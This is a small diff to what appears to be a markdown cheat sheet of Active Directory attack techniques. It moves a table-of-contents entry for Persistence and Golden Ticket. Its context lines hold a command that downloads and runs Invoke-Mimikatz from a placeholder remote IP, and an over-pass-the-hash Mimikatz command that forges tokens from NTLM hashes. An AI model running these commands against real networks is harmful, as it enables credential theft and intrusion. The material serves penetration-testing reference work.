@@ -16,8 +16,6 @@ Last update: **18 Nov 2021**
   -  [Domain Trust Mapping](#domain-trust-mapping)
   -  [Domain Forest Enumeration](#domain-forest-enumeration)
   -  [User Hunting](#user-hunting)
--  [Persistence](#persistence)
-  -  [Golden Ticket](#golden-ticket)
 -  [Local Privilege Escalation](#local-privilege-escalation)
 -  [Lateral Movement](#lateral-movement)
 -  [Persistence](#persistence)
@@ -333,6 +331,7 @@ iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)
 # "Over pass the hash" generate tokens from hashes
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'
 ```
+
 # Persistence
 
 ### Golden Ticket
